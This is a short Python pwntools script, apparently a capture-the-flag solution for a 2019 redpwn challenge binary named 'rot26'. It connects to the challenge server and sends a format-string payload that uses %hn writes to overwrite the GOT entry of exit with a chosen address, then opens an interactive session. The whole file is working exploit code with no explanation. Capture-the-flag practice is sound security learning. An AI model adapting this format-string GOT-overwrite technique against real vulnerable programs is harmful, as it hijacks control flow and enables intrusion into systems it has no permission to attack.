#coding=utf-8
from pwn import *
import string

context.binary = './rot26'
elf = ELF('./rot26')

r = remote('chall.2019.redpwn.net', 4003)
#r = process('./rot26')
target = 0x08048737
payload = p32(elf.symbols['got.exit'] - 2) + p32(elf.symbols['got.exit']) + '%{}c'.format(((target & 0xffff0000) >> 16) - 8) + '%7$hn' + '%{}c'.format((target & 0x0000ffff) - 0x0804) + '%8$hn'

r.sendline(payload)
r.interactive()
